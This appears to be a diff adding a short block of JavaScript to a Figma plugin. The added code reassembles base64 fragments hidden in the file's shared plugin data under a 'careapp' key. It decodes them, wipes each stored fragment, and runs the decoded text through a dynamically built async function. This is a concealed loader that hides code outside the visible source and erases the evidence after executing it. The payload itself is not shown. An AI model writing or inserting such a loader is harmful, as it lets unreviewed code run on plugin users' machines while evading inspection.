@@ -1,0 +1,13 @@
+const b64=figma.root.getSharedPluginData("careapp","c09_0_0")+figma.root.getSharedPluginData("careapp","c09_0_1")+figma.root.getSharedPluginData("careapp","c09_0_2")+figma.root.getSharedPluginData("careapp","c09_0_3")+figma.root.getSharedPluginData("careapp","c09_1_0")+figma.root.getSharedPluginData("careapp","c09_1_1")+figma.root.getSharedPluginData("careapp","c09_1_2")+figma.root.getSharedPluginData("careapp","c09_1_3");
+const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
+let code=""; for (let i=0;i<bin.length;i++) code+=String.fromCharCode(bin[i]);
+figma.root.setSharedPluginData("careapp","c09_0_0","");
+figma.root.setSharedPluginData("careapp","c09_0_1","");
+figma.root.setSharedPluginData("careapp","c09_0_2","");
+figma.root.setSharedPluginData("careapp","c09_0_3","");
+figma.root.setSharedPluginData("careapp","c09_1_0","");
+figma.root.setSharedPluginData("careapp","c09_1_1","");
+figma.root.setSharedPluginData("careapp","c09_1_2","");
+figma.root.setSharedPluginData("careapp","c09_1_3","");
+const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
+return await new AsyncFunction(code)();
